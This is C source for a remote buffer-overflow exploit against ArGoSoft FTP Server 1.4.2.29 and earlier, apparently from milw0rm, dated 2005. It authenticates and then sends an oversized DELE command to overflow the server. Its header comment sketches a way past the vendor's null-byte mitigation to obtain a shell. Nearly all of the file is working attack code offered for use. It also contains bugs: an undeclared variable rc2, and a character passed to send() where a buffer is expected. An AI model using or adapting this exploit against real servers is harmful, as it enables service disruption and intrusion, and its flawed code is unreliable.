 /*
  ArGoSoft Ftp Server remote overflow exploit
  author : c0d3r "kaveh razavi" c0d3rz_team@yahoo.com c0d3r@ihsteam.com
  package : ArGoSoft 1.4.2.29 and prior 
  advisory : packetstormsecurity.nl/0503-advisories/argosoftFTP1428.txt
  company address : argosoft.com
  the bug was found by a mate and reported to argosoft and they released
  another version . I downloaded the patched ver at www.argosoft.com
  and started to test the server . I saw that they worked with the vul 
  but they didnt solve the mentioned DELE overflow . he did a wise job
  every long char which would be send to server it will write a nullbyte 
  in the middle so we cant overwrite eip or other registers normally .
  The eip would be overwrite like 00410041 which seems useless . the server
  wont crash but it shows that it has beed overflowed . but the program maker
  doesnt think there are people who can do wiser job ! well there is a way to 
  get shell.I just mention it.the code below is just show that the server is vuln.
  we can overwrite eip with a nullbyte without sending a null !!!
  so think there is a jmp call pop push register is around 004400E1 (for example)
  so we can directly jmp to anywhere we want . anyway if u want u can try .
  compiled with visual c++ 6 : cl argo.c
  greetz : LorD and NT of IHSTeam,Jamie of exploitdev,simorgh-ev,PiShi,redhat
  sIiiS and vahid,str0ke (milw0rm),roberto (zone-h),securiteam,and other friends .
  Congratulate new iran irc server irc.iraneman.org #iran #ihs 
  and new site www.ihsteam.com 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define size 290 // enough for overflowing play with it for more result
                           

 int main (int argc, char *argv[]){

  unsigned char *recvbuf,*user,*pass;
  unsigned int rc,addr,sock ;
  struct sockaddr_in tcp;
  struct hostent *hp;
  WSADATA wsaData;
  char buffer[size];
  unsigned short port;

  int i;
  if(argc < 5) {
      printf("\n-------- ArGoSoft Ftp remote exploit by c0d3r --------\n");
   printf("-------- usage : argo.exe host port user pass --------\n");
   printf("-------- eg: argo.exe 127.0.0.1 21 c0d3r secret --------\n\n");
  exit(-1) ;
  }
  printf("\n-------- ArGoSoft Ftp remote exploit by c0d3r --------\n\n");
  recvbuf = malloc(256);
  memset(recvbuf,0,256);
  
  //Creating exploit code
  printf("[+] building overflow string");
    memset(buffer,0,size);

   buffer[0] = 'D';buffer[1] = 'E';buffer[2] = 'L';buffer[3]='E'; buffer[4]= 0x20;
   for(i = 5;i != 286;i++){
   buffer[i] = 'A';
  }
 //EO exploit code

  user = malloc(256);
  memset(user,0,256);

  pass = malloc(256);
  memset(pass,0,256);

  sprintf(user,"user %s\r\n",argv[3]);
  sprintf(pass,"pass %s\r\n",argv[4]);
  
   if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("[-] WSAStartup failed !\n");
   exit(-1);
  }
 hp = gethostbyname(argv[1]);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp) && (addr == INADDR_NONE) ){
   printf("[-] unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){
   printf("[-] socket() error...\n");
   exit(-1);
  }
   if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
  tcp.sin_family = AF_INET;
  port=atoi(argv[2]);
  tcp.sin_port=htons(port);
   
  
  printf("\n[+] attacking host %s\n" , argv[1]) ;
  
  Sleep(1000);
  
  printf("[+] packet size = %d byte\n" , sizeof(buffer));
  
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
     Sleep(1000) ;
  printf("[+] connected\n") ;
     rc2=recv(sock,recvbuf,256,0);
     printf("[+] sending username\n");
     send(sock,user,strlen(user),0);
     send(sock,'\n',1,0);
     printf("[+] sending passworld\n");
     Sleep(1000);  
	 send(sock,pass,strlen(pass),0);
     send(sock,'\n',1,0);
     Sleep(1000);
	 send(sock,buffer,strlen(buffer),0);
	 send(sock,'\n',1,0);
	 printf("[+] string sent successfully check the main window for result\n");
  }
  
  else {
      printf("[-] ArGo is not listening .... \n");
 }
  shutdown(sock,1);
  closesocket(sock);
 
}

// milw0rm.com [2005-04-03]
